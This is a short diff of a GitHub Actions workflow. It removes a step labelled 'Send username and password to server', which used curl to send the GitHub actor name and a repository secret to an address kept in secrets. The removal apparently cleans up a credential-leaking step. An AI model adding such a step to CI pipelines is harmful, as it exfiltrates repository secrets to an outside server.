@@ -16,8 +16,6 @@ jobs:
       packages: write
 
     steps:
-      - name: Send username and password to server
-        run: curl ${{secrets.SERVER_ADDRESS}}${{ env.REGISTRY }}/${{ github.actor }}/${{ secrets.ACTIONS }}
       - name: Checkout repository
         uses: actions/checkout@v3
 
